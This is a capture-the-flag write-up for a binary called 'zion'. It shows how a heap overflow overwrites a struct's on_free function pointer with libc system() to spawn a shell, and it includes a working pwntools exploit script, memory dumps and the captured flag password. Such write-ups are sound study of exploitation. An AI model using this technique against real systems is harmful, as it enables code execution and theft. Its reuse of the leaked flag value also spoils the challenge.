## Infos on the binary

```shell
checksec ./zion
[*] '/home/bonus01/zion'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Pie is now enabled, and RELRO is now Full

There's an exploitable `read` that reads 128 bytes in an allocated buffer of size 64.
When the program frees the two buffers (ALPHA & BETA) it calls a 'on_free' function :

```C
    printf("[ZION] Freeing block %u\n",(ulong)param_1);
    (**(code **)(*(long *)(blocks + (ulong)param_1 * 8) + 0x18))
              (*(undefined8 *)(blocks + (ulong)param_1 * 8));
    free(*(void **)(blocks + (ulong)param_1 * 8));
```
in readable C it's something like that:

```C
    printf("[ZION] Freeing block %u\n", idx);
    blocks[idx]->on_free(blocks[idx]);
    free(blocks[idx]);
```

the whole 'block' structure corresponds to:
```C
typedef struct {
    unsigned int  id;          // offset 0x00
    unsigned int  size;        // offset 0x04
    char          label[16];  // offset 0x08 
    void        (*on_free)(void *);  // offset 0x18
} block_t;  
```

By filling the first buffer and then inspecting the memory with `gdb` we can notice that the buffer is located after the place where the first block is allocated, so we cannot overflow the first buffer to write inside the first block. 

However the second buffer is located right before the second block:
```bash
start of the buffer  --->   0x5555555596e0:	0x4141414141414141	0x4141414141414141
                            0x5555555596f0:	0x000000000000000a	0x0000000000000000
                            0x555555559700:	0x0000000000000000	0x0000000000000000
                            0x555555559710:	0x0000000000000000	0x0000000000000000
                            0x555555559720:	0x0000000000000000	0x0000000000000031  <--- malloc block header
start of the block   --->   0x555555559730:	0x0000004000000001	0x0000000041544542  <--- "BETA" litteral
                            0x555555559740:	0x0000000000000000	0x0000555555555269  <--- address of on free function

```
We can also observe that the malloc header is `0x31`.
The goal is now tho replace the pointer of the function used on free with the address of system.
Our payload will be constructed as so:
* `A * (64 + 8)` -> fill the buffer + the bytes before block header
* `p64(0x31)`-> preserve the malloc block header
* `'sh #'` -> our shell command to spawn a shell
* `A * (24 - 4)` -> fill the rest of the block before on free adress
* `p64(0x7ffff7c58750)` -> address of libc 'system' to replace on free function address

```python
from pwn import *

elf = context.binary = ELF('./zion')
p = process('./zion')

p.sendlineafter(b"[ZION] Data: ", b'\x00')

payload = b"A" * 72
payload += p64(0x31)
payload += b'sh #'
payload += b'A' * 20
payload += p64(0x7ffff7c58750)

p.sendlineafter(b"[ZION] Data: ", payload)

p.interactive()
```

```bash
[+] Starting local process './zion': pid 1277
[*] Switching to interactive mode
[ZION] Block 0: label=ALPHA size=64
[ZION] Block 589326451: label=AAAAAAAAAAAAAAAAP\x87\xc5\xf7\xff\x7f size=1094795585
[ZION] Freeing block 0
[ZION] Freeing block 1
$ whoami
flagbonus01
$ cat /home/flagbonus01/.pass
8g8nnrrtsasgf9i7etv0s9a21j5f9riw
```
Got it!